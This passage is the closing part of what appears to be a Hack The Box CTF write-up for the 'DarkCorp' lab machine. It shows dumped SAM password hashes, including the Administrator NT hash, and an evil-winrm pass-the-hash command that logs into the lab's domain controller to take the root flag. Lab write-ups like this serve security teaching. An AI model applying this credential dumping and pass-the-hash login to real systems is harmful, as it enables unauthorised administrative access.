+[*] Target system bootKey: 0xe7c8f385f342172c7b0267fe4f3cbbd6
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Dumping cached domain logon information (domain/username:hash)</code></pre>
+</doc-codeblock></div>
+<p>Now we can grab the root flag.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ evil-winrm -i dc-01.darkcorp.htb -u Administrator -H 'fcb3ca5a19a1ccf2d14c13e8b64cde0f'</code></pre>
+</doc-codeblock></div>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer id="retype-content-footer" class="clear-both">
+                            
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/checker/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
+                                                <span class="block mt-1">Checker (Hard)</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/hackthebox/machines/infiltrator/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
+                                                <span class="block mt-1">Infiltrator (Insane)</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                                <div id="retype-footer-links" class="print:hidden">
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="retype-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "DarkCorp (Insane)", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
